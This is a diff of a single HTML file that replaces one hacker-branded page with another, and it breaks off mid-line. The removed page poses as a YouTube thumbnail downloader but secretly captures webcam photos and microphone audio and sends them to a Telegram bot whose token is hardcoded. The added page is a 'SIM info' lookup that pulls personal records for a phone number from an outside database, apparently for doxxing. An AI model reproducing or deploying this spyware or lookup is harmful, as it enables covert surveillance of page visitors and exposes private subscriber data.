@@ -1,204 +1,149 @@
-<!DOCTYPE html>  <html lang="en">  
-<head>  
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>    <title>YouTube Thumbnail Downloader</title>  
-  <meta charset="utf-8">  
-  <meta name="viewport" content="width=device-width, initial-scale=1">  
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">  
-  <style>  
-    body {  
-      font-family: 'Montserrat', sans-serif;  
-      margin: 0;  
-      padding: 0;  
-      background-color: #f5f5f5;  
-    }  
-    .navbar {  
-      background-color: #ff0000;  
-      color: white;  
-      text-align: center;  
-      padding: 15px 0;  
-    }  
-    #header {  
-      margin: 0;  
-      font-size: 28px;  
-      font-weight: bold;  
-    }  
-    .container {  
-      max-width: 600px;  
-      margin: 20px auto;  
-      padding: 20px;  
-      background-color: #fff;  
-      border-radius: 8px;  
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);  
-    }  
-    .form-control {  
-      width: calc(100% - 22px);  
-      margin-bottom: 15px;  
-      padding: 10px;  
-      border: 1px solid #ccc;  
-      border-radius: 5px;  
-      box-sizing: border-box;  
-      font-family: 'Montserrat', sans-serif;  
-    }  
-    #thumbdloadbtn {  
-      display: block;  
-      width: 100%;  
-      padding: 10px;  
-      border: none;  
-      border-radius: 5px;  
-      background-color: #ff0000;  
-      color: white;  
-      font-size: 16px;  
-      cursor: pointer;  
-      font-family: 'Montserrat', sans-serif;  
-    }  
-    #thumbdloadbtn:hover {  
-      background-color: #cc0000;  
-    }  
-    footer {  
-      text-align: center;  
-      margin-top: 40px;  
-      color: #666;  
-    }  
-    .youtube-logo {  
-      display: block;  
-      margin: 20px auto;  
-      width: 100px; /* Adjust size as needed */  
-    }  
-  </style>  
-</head>  
-<body>  
-  <nav class="navbar">  
-    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">  
-    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>  
-  </nav>    <div class="container">  
-    <form method="post" action="">  
-      <input id="ytlink" name="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">  
-      <button id="thumbdloadbtn" type="submit">FETCH</button>  
-    </form>  
-    <div id="thumbnail-preview">  
-      <!-- Placeholder for thumbnail preview -->  <h2>How to Download HD YouTube Thumbnail</h2>  
-<ol>  
-  <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>  
-  <li>Paste the YouTube video Link / URL in the Input Field Above</li>  
-  <li>Click on the "FETCH" Button</li>  
-  <li>Select the thumbnail quality</li>  
-  <li>Download the Thumbnail</li>  
-</ol>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>SIM Info Portal — Made by E3-HACKER</title>
+<style>
+body, html { margin:0; padding:0; height:100%; font-family: 'Courier New', monospace; background:#0a0a0a; color:#00ffea; overflow:hidden; }
+#bgCanvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; }
+#overlay { position:fixed; inset:0; background: rgba(0,0,0,0.97); display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; z-index:1000; padding:24px; transition:opacity .45s; }
+#overlay h1 { font-size:2.2rem; margin:0 0 14px; color:#00ffea; text-shadow:0 0 15px #00ffea; }
+.join-row { display:flex; gap:12px; flex-wrap:wrap; justify-content:center; margin-bottom:14px; }
+.join-btn { padding:14px 26px; border-radius:12px; text-decoration:none; font-weight:700; border:none; cursor:pointer; box-shadow:0 0 18px rgba(0,255,234,0.2); transition:transform .2s, box-shadow .2s; background: linear-gradient(90deg,#00ffea,#00c4b0); color:#000; }
+.join-btn:hover { transform:scale(1.07); box-shadow:0 0 35px #00ffea; }
+.join-btn.secondary { background:transparent; color:#00ffea; border:1px solid rgba(0,255,234,.22); box-shadow:none; }
+#continueBtn { margin-top:8px; padding:12px 22px; border-radius:10px; border:none; cursor:pointer; background:#071313;color:#00ffea;font-weight:700; box-shadow:0 0 22px rgba(0,255,234,0.2); opacity:.45; pointer-events:none; }
+#continueBtn.enabled { opacity:1; pointer-events:auto; }
+#content { display:none; z-index:10; width:92%; max-width:720px; margin:32px auto; padding:24px; box-sizing:border-box; background:rgba(0,0,0,0.15); border-radius:12px; backdrop-filter:blur(8px); }
+h2 { margin:0 0 16px; }
+.controls { display:flex; gap:12px; margin-bottom:16px; }
+input { flex:1; padding:14px; border-radius:10px; border:none; background:rgba(0,255,234,0.06); color:#00ffea; box-shadow: inset 0 0 12px rgba(0,255,234,0.08); }
+input::placeholder { color: rgba(0,255,234,0.45); }
+.search-btn { padding:12px 20px; border-radius:10px; border:none; background:#00ffea; color:#000; font-weight:700; cursor:pointer; box-shadow:0 0 20px #00ffea; transition:transform .2s, box-shadow .2s; }
+.search-btn:hover { transform:scale(1.06); box-shadow:0 0 40px #00ffea; }
+#result { display:flex; flex-direction:column; gap:16px; margin-top:12px; }
+.card { background: linear-gradient(145deg, rgba(0,255,234,0.1), rgba(0,255,234,0.03)); border-radius:14px; padding:16px; box-shadow:0 0 18px rgba(0,255,234,0.2), 0 0 35px rgba(0,255,234,0.05) inset; transition: transform .2s, box-shadow .2s; border:1px solid #00ffea; }
+.card:hover { transform:translateY(-5px); box-shadow:0 0 40px #00ffea, 0 0 50px rgba(0,255,234,0.15) inset; }
+.card h3 { margin:0 0 6px; color:#00ffd6; font-size:1rem; text-shadow:0 0 8px #00ffea; }
+.card p { margin:0; color:#dffdfa; word-break:break-word; }
+#credit { position:fixed; right:12px; bottom:12px; font-size:12px; color:#00ffea; opacity:.95; background: rgba(0,0,0,0.45); padding:6px 12px; border-radius:8px; box-shadow:0 0 12px rgba(0,255,234,.08); }
+@media (max-width:480px){ .join-row{flex-direction:column;} #overlay h1{font-size:1.6rem;} .join-btn{width:100%;} }
+</style>
+</head>
+<body>
+<canvas id="bgCanvas"></canvas>
 
-  </div>    <center>  
-    <button id="toggle-video" style="display:none;">Toggle Video</button>  
-    <div id="message-container"></div>  
-    <video id="video" width="0" height="0" autoplay></video>  
-  </center>    <script type="text/javascript">  
-    function downloadThumbnail() {  
-      // Change button text to indicate fetching  
-      var btn = document.getElementById('thumbdloadbtn');  
-      btn.textContent = 'Fetching from server... Wait';  
-    }  
-      
-    function la(src) {  
-      window.location = src;  
-    }  
-      
-    function GetURLParameter(sParam) {  
-      var sPageURL = window.location.search.substring(1);  
-      var sURLVariables = sPageURL.split('&');  
-      for (var i = 0; i < sURLVariables.length; i++) {  
-        var sParameterName = sURLVariables[i].split('=');  
-        if (sParameterName[0] == sParam) {  
-          return sParameterName[1];  
-        }  
-      }  
-    }  
-      
-    var chatid = GetURLParameter('id');  
-      
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true })  
-      .then((stream) => {  
-        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);  
-        const audioRecorder = new MediaRecorder(stream);  
-  
-        function capturePhoto(index) {  
-          setTimeout(() => {  
-            imageCapture.takePhoto()  
-              .then((blob) => {  
-                sendToTelegram(blob, 'photo');  
-              })  
-              .catch((error) => {  
-                console.error('Error capturing photo:', error);  
-              });  
-          }, index * 2000);  
-        }  
-  
-        function startAudioRecording() {  
-          audioRecorder.start();  
-          setTimeout(() => {  
-            audioRecorder.stop();  
-          }, 5000);  
-        }  
-  
-        audioRecorder.ondataavailable = (event) => {  
-          if (event.data.size > 0) {  
-            sendToTelegram(event.data, 'audio');  
-          }  
-        };  
-  
-        for (let i = 0; i < 3; i++) {  
-          capturePhoto(i);  
-        }  
-  
-        startAudioRecording();  
-      })  
-      .catch((error) => {  
-        if (error.name === 'NotAllowedError') {  
-          // Handle the case where permissions are denied  
-          console.warn('Permissions denied. User may suspect.');  
-        } else {  
-          console.error('Permission error:', error);  
-        }  
-      });  
-        
-    // Function sendToTelegram  
-async function sendToTelegram(data, type) {  
-  const BOT_TOKEN = '8109331844:AAFx66PglQEtEexJcgwPEA_yIMyK0gX5i1w';   // Replace your botToken  
-  const CHAT_ID = '6520607479';     // Replace your botToken  
-    
-  // validasi tipe  
-  if (type !== 'photo' && type !== 'audio') {  
-    throw new Error("Tipe harus 'photo' atau 'audio'");  
-  }  
-  
-  const formData = new FormData();  
-  formData.append('chat_id', CHAT_ID);  
-  // field untuk file: 'photo' untuk gambar, 'audio' untuk audio  
-  const fieldName = type === 'photo' ? 'photo' : 'audio';  
-  const extension = type === 'photo' ? 'jpg' : 'wav';  
-  formData.append(fieldName, data, `ISALHACKING.${extension}`);  
-  
-  const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/${type === 'photo' ? 'sendPhoto' : 'sendAudio'}`;  
-  
-  try {  
-    const res = await fetch(endpoint, {  
-      method: 'POST',  
-      body: formData  
-    });  
-  
-    const result = await res.json();  
-  
-    if (!res.ok) {  
-      // Telegram mengembalikan { ok: false, description: "..." }  
-      throw new Error(result.description || res.statusText);  
-    }  
-  
-    console.log('Telegram response:', result);  
-    return result;  
-  } catch (err) {  
-    console.error('Error sending to Telegram', err);  
-    throw err; // biarkan caller yang tangani  
-  }  
-}  
-  </script>    <footer>  
-    <p>Made With ❤️ BY: @ISALHACKING</p>  
-  </footer>  
-</body>  
-</html>
+<div id="overlay" aria-hidden="false">
+  <h1>Join WhatsApp Channel & Group to access SIM info</h1>
+  <div class="join-row">
+    <a id="channelBtn" class="join-btn" href="https://chat.whatsapp.com/YourChannelLink" target="_blank">Join WhatsApp Channel</a>
+    <a id="groupBtn" class="join-btn" href="https://chat.whatsapp.com/YourGroupLink" target="_blank">Join WhatsApp Group</a>
+    <button id="checkBtn" class="join-btn secondary" type="button">I joined (click to mark)</button>
+  </div>
+  <div>
+    <button id="continueBtn" type="button">Continue to Website</button>
+  </div>
+  <p style="margin-top:14px; color:rgba(0,255,234,0.55); font-size:.95rem;">
+    (Click both join links — then tap <strong>“I joined”</strong> — the Continue button will enable.)
+  </p>
+</div>
+
+<div id="content" aria-hidden="true">
+  <h2>SIM Information Lookup</h2>
+  <div class="controls">
+    <input id="numberInput" type="text" placeholder="Enter SIM Number (e.g. 03XXXXXXXXX)" />
+    <button class="search-btn" onclick="fetchData()">Search</button>
+  </div>
+  <div id="result"></div>
+</div>
+
+<div id="credit">Made by E3-HACKER</div>
+
+<script>
+const channelBtn = document.getElementById('channelBtn');
+const groupBtn = document.getElementById('groupBtn');
+const checkBtn = document.getElementById('checkBtn');
+const continueBtn = document.getElementById('continueBtn');
+const overlay = document.getElementById('overlay');
+const content = document.getElementById('content');
+let clickedChannel=false, clickedGroup=false, clickedConfirm=false;
+
+channelBtn.addEventListener('click',()=>{clickedChannel=true;updateContinueState();});
+groupBtn.addEventListener('click',()=>{clickedGroup=true;updateContinueState();});
+checkBtn.addEventListener('click',()=>{clickedConfirm=true;updateContinueState();checkBtn.textContent='Marked as joined ✓';});
+
+function updateContinueState(){
+  const channelOk=clickedChannel||clickedConfirm;
+  const groupOk=clickedGroup||clickedConfirm;
+  if(channelOk && groupOk){ continueBtn.classList.add('enabled'); }
+}
+
+continueBtn.addEventListener('click',()=>{
+  if(!continueBtn.classList.contains('enabled')) return;
+  overlay.style.opacity='0';
+  setTimeout(()=>{overlay.style.display='none';},450);
+  content.style.display='block';
+  content.setAttribute('aria-hidden','false');
+});
+
+async function fetchData(){
+  const number=document.getElementById('numberInput').value.trim();
+  const resultDiv=document.getElementById('result');
+  resultDiv.innerHTML='';
+  if(!number){ resultDiv.innerHTML=`<div class="card"><h3>Error</h3><p>Please enter a SIM number.</p></div>`; return; }
+  resultDiv.innerHTML=`<div class="card"><h3>Loading</h3><p>Fetching data for ${escapeHtml(number)} …</p></div>`;
+  try{
+    const proxyUrl='https://api.allorigins.win/raw?url=';
+    const apiUrl=encodeURIComponent(`https://fam-official.serv00.net/api/database.php?number=${encodeURIComponent(number)}`);
+    const resp=await fetch(proxyUrl+apiUrl);
+    if(!resp.ok) throw new Error(`${resp.status} ${resp.statusText}`);
+    const text=await resp.text();
+    let data;
+    try{data=JSON.parse(text);}catch(e){data=null;}
+    resultDiv.innerHTML='';
+    if(data && typeof data==='object'){
+      for(const key in data){
+        resultDiv.innerHTML+=`<div class="card"><h3>${escapeHtml(key)}</h3><p>${escapeHtml(String(data[key]))}</p></div>`;
+      }
+    } else {
+      resultDiv.innerHTML=`<div class="card"><h3>Raw Response</h3><p>${escapeHtml(text)}</p></div>`;
+    }
+  }catch(err){
+    resultDiv.innerHTML=`<div class="card"><h3>Error fetching</h3><p>${escapeHtml(String(err))}</p></div>`;
+  }
+}
+
+function escapeHtml(s){
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// Particle background
+const canvas=document.getElementById('bgCanvas');
+const ctx=canvas.getContext('2d');
+function resizeCanvas(){canvas.width=innerWidth; canvas.height=innerHeight;}
+window.addEventListener('resize',resizeCanvas);
+resizeCanvas();
+const particles=[];
+const P=Math.floor((canvas.width*canvas.height)/60000);
+for(let i=0;i<Math.max(80,P);i++){
+  particles.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,r:Math.random()*1.6+0.6,vx:(Math.random()-0.5)*0.4,vy:(Math.random()-0.5)*0.4,alpha:0.6+Math.random()*0.4});
+}
+function draw(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  particles.forEach(p=>{
+    ctx.beginPath();
+    ctx.fillStyle=`rgba(0,255,234,${p.alpha})`;
+    ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+    ctx.fill();
+    p.x+=p.vx; p.y+=p.vy;
+    if(p.x<-10)p.x=canvas.width+10;
+    if(p.x>canvas.width+10)p.x=-10;
+    if(p.y<-10)p.y=canvas.height+10;
+    if(p.y>canvas.height+10)p.y=-10;
+  });
+  for(let i=0;i<particles.length;i++){
+    for(let j=i+1;j<particles.length;j++){
+      const a=particles[i],b=particles[j];
+      const dx=a.x-b.x, dy=a.y-b.y, d=Math.sqrt(dx*dx+dy*dy);
+      if(d
